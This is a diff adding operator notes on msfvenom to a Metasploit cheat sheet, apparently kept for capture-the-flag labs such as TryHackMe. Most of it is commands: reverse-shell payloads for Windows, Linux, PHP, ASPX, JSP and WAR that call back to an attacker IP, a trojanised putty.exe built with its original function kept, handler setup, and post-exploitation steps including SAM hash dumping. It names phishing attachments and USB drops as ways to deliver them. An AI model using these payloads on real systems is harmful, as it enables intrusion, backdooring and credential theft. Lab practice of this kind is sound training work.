@@ -1383,3 +1383,687 @@ cat C:\Users\Administrator\Desktop\flag.txt
 10. Background the session and run post-exploitation modules as needed.
 
 This sequence covers the majority of Windows-focused TryHackMe and Hack The Box Meterpreter exercises.
+
+---
+
+---
+
+# Metasploit Payload Generation (msfvenom) - Operator Notes
+
+## Purpose
+
+Use **msfvenom** whenever **Metasploit doesn't deliver the payload for you.**
+
+Examples:
+
+* File upload vulnerability
+* SSH access but want Meterpreter
+* Phishing attachment
+* USB drop
+* Web shell upload
+* Custom exploit
+* Buffer overflow shellcode
+
+Workflow:
+
+```
+Generate Payload
+        ↓
+Deliver Payload
+        ↓
+Start multi/handler
+        ↓
+Victim Executes
+        ↓
+Meterpreter Session
+```
+
+---
+
+# Basic Command
+
+```
+msfvenom -p PAYLOAD LHOST=<IP> LPORT=<PORT> -f FORMAT -o output
+```
+
+Example
+
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+LHOST=10.10.14.5 \
+LPORT=4444 \
+-f exe \
+-o shell.exe
+```
+
+Remember:
+
+```
+-p      Payload
+
+LHOST   My IP
+
+LPORT   Listening Port
+
+-f      Output Format
+
+-o      Save File
+```
+
+---
+
+# Common Payloads
+
+## Windows Meterpreter
+
+```
+windows/x64/meterpreter_reverse_tcp
+```
+
+Output
+
+```
+-f exe
+```
+
+Produces
+
+```
+shell.exe
+```
+
+---
+
+## Linux Meterpreter
+
+```
+linux/x64/meterpreter_reverse_tcp
+```
+
+Output
+
+```
+-f elf
+```
+
+Produces
+
+```
+shell.elf
+```
+
+Need:
+
+```
+chmod +x shell.elf
+./shell.elf
+```
+
+---
+
+## PHP Upload
+
+```
+php/meterpreter_reverse_tcp
+```
+
+Output
+
+```
+-f raw
+```
+
+Save
+
+```
+shell.php
+```
+
+Upload then browse
+
+```
+http://target/uploads/shell.php
+```
+
+Always verify
+
+```
+<?php
+```
+
+exists at top.
+
+---
+
+## ASPX Upload
+
+```
+windows/x64/meterpreter_reverse_tcp
+```
+
+```
+-f aspx
+```
+
+Produces
+
+```
+shell.aspx
+```
+
+---
+
+## JSP Upload
+
+```
+java/meterpreter/reverse_tcp
+```
+
+```
+-f jsp
+```
+
+Produces
+
+```
+shell.jsp
+```
+
+---
+
+## WAR Deployment
+
+```
+java/meterpreter/reverse_tcp
+```
+
+```
+-f war
+```
+
+Produces
+
+```
+shell.war
+```
+
+Deploy via Tomcat Manager.
+
+---
+
+## Python One-Liner
+
+```
+cmd/unix/reverse_python
+```
+
+```
+-f raw
+```
+
+Prints
+
+```
+python -c "..."
+```
+
+Useful for
+
+* SSH
+* Command Injection
+* Existing shell
+
+---
+
+# Staged vs Stageless
+
+## Staged
+
+```
+meterpreter/reverse_tcp
+```
+
+Notice
+
+```
+/
+```
+
+Small payload
+
+Downloads Meterpreter later
+
+Needs handler to deliver stage
+
+Good for
+
+* Exploits
+* Buffer Overflows
+
+---
+
+## Stageless
+
+```
+meterpreter_reverse_tcp
+```
+
+Notice
+
+```
+_
+```
+
+Entire payload inside executable
+
+Larger
+
+More reliable
+
+Preferred for
+
+* File uploads
+* USB
+* Phishing
+* Standalone EXEs
+
+---
+
+# Remember
+
+```
+Slash  = Staged
+
+Underscore = Stageless
+```
+
+---
+
+# Output Formats
+
+## Executables
+
+| Format | Platform |
+| ------ | -------- |
+| exe    | Windows  |
+| elf    | Linux    |
+| macho  | macOS    |
+| apk    | Android  |
+| war    | Java     |
+
+---
+
+## Transform Formats
+
+Not executable.
+
+Used for embedding.
+
+| Format     | Use            |
+| ---------- | -------------- |
+| raw        | Webshells      |
+| c          | C Shellcode    |
+| python     | Python Loader  |
+| powershell | PowerShell     |
+| hex        | Hex Output     |
+| base64     | Encoded Output |
+
+---
+
+# Listing Things
+
+Payloads
+
+```
+msfvenom -l payloads
+```
+
+Search
+
+```
+msfvenom -l payloads | grep windows
+```
+
+Formats
+
+```
+msfvenom -l formats
+```
+
+Encoders
+
+```
+msfvenom -l encoders
+```
+
+Platforms
+
+```
+msfvenom -l platforms
+```
+
+Architectures
+
+```
+msfvenom -l archs
+```
+
+Payload Options
+
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
+```
+
+---
+
+# Encoders
+
+Common
+
+```
+x86/shikata_ga_nai
+```
+
+Example
+
+```
+-e x86/shikata_ga_nai
+```
+
+Iterations
+
+```
+-i 5
+```
+
+Avoid Bad Characters
+
+```
+-b '\x00\x0a\x0d'
+```
+
+### Reality
+
+Encoders **DO NOT** bypass modern AV/EDR.
+
+Use encoding for
+
+* Bad characters
+* Exploit constraints
+
+Not
+
+* Stealth
+* AV bypass
+
+---
+
+# Inject into Existing Executable
+
+Template
+
+```
+-x putty.exe
+```
+
+Keep Original Functionality
+
+```
+-k
+```
+
+Example
+
+```
+msfvenom \
+-p windows/x64/meterpreter_reverse_tcp \
+LHOST=10.10.14.5 \
+LPORT=4444 \
+-x putty.exe \
+-k \
+-f exe \
+-o putty_backdoor.exe
+```
+
+---
+
+# Handler
+
+```
+use exploit/multi/handler
+```
+
+Set payload
+
+```
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+```
+
+Listener
+
+```
+set LHOST 10.10.14.5
+set LPORT 4444
+```
+
+Start
+
+```
+run
+```
+
+Or background
+
+```
+run -j
+```
+
+---
+
+# EVERYTHING MUST MATCH
+
+Payload
+
+```
+msfvenom
+
+↓
+
+multi/handler
+```
+
+Must match exactly.
+
+These three **must** be identical:
+
+```
+Payload
+
+LHOST
+
+LPORT
+```
+
+Even
+
+```
+meterpreter/reverse_tcp
+```
+
+and
+
+```
+meterpreter_reverse_tcp
+```
+
+are **different payloads**.
+
+---
+
+# Typical Workflow
+
+Generate
+
+```
+msfvenom ...
+```
+
+↓
+
+Transfer
+
+```
+SMB
+
+SSH
+
+Upload
+
+USB
+
+Email
+
+Exploit
+```
+
+↓
+
+Listener
+
+```
+multi/handler
+```
+
+↓
+
+Victim executes
+
+↓
+
+Meterpreter
+
+↓
+
+Post Exploitation
+
+---
+
+# Useful Meterpreter Commands
+
+```
+sysinfo
+```
+
+System info
+
+```
+getuid
+```
+
+Current user
+
+```
+ps
+```
+
+Processes
+
+```
+migrate PID
+```
+
+Move into stable process
+
+```
+hashdump
+```
+
+Dump SAM hashes (SYSTEM required)
+
+```
+search -f flag.txt
+```
+
+Find files
+
+```
+download
+```
+
+Download files
+
+```
+upload
+```
+
+Upload files
+
+```
+shell
+```
+
+Drop into CMD
+
+```
+background
+```
+
+Return to msfconsole
+
+---
+
+# Decision Tree
+
+**Need an executable?**
+
+```
+Windows → exe
+
+Linux → elf
+
+macOS → macho
+
+Android → apk
+```
+
+---
+
+**Uploading to a website?**
+
+```
+PHP → raw
+
+ASPX → aspx
+
+JSP → jsp
+
+Tomcat → war
+```
+
+---
+
+**Need shellcode?**
+
+```
+C → -f c
+
+Python → -f python
+
+PowerShell → -f powershell
+
+Hex → -f hex
+```
+
+---
+
+# Things That Bite You at 2 AM
+
+* `LHOST` is **your reachable IP**, not the victim's.
+* `LPORT` must match in both `msfvenom` and `multi/handler`.
+* `meterpreter/reverse_tcp` ≠ `meterpreter_reverse_tcp`.
+* Linux payloads need `chmod +x`.
+* PHP payloads should begin with `<?php`.
+* `run -j` keeps the handler in the background.
+* `set ExitOnSession false` lets one handler catch multiple victims.
+* If no session appears, first verify **Payload → LHOST → LPORT → Network reachability → Firewall** before assuming the payload is broken.
+
